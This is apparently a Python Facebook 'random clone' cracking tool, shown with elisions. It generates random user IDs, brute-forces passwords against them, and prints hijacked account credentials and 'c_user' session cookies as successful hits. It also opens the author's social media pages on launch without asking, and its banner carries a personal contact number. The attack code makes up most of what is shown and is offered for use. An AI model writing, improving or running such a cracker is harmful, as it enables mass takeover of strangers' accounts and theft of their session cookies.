#Create By: TORUN AHMED
#FaceBook: TORUN AHMED
#GitHub: https://github.com/toruna810
#---------------------------------------------------------------------------#
...
for xd in range(10000):
    ...
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://github.com/toruna810')
logo = ("""
\033[1;91m    
...
'--.  .--''  .-.  '|  .--. '|  | |  ||  ,'.|  | 
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mTORUN AHMED                ┃
 ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
 ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
 ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
 ┃ [✓] GITHUB    \033[1;91m: \033[1;92mTORUN007                   ┃
 ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mTORUN AHMED                ┃
 ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+8801683628387             ┃
 ┃ [✓] Vertion    \033[1;91m: \033[1;92m.0.1                      ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
class Main:
    def __init__(self):
        ...
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        TORUN =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/torunahmed1719095ff?mibextid=ZbWKwL')
        if TORUN in ["1", "01"]:
            num()
        if TORUN in ["2","02"]:
            gml()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mTORUN\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[TORUN-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[TORUN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
Main()  